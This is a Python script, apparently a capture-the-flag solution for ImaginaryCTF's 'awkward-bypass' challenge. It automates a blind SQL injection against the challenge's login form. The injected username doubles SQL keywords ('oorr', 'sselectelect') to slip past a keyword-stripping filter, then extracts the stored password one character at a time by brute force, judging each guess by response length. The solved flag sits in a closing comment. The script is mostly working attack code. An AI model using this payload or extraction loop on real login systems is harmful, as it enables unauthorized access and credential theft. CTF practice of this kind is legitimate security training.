import requests
from string import ascii_letters
import threading

chars = ascii_letters + ":?{}_/0123456789"
burp0_url = "https://awkward-bypass.chal.imaginaryctf.org:443/user"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://awkward-bypass.chal.imaginaryctf.org", "Referer": "https://awkward-bypass.chal.imaginaryctf.org/", "Upgrade-Insecure-Requests": "1", "Dnt": "1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
flag = ""

for i in range(1, 100):
    mark = True
    for c in chars:
        burp0_data = {"username": f"' oorr substr((sselectelect paassswoorrd frfromom users),{str(i)},1)='{c}';--", "password": "fdsf"}
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        if r.status_code == 503:
            print('503 with ' + str(i) + ' at ' + c)
        if len(r.text) == 323:
            flag += c
            print(flag)
            mark = False
            break
    if mark: flag += "@"
      
 # ictf{n1c3_fil73r_byp@ss_7130676d}
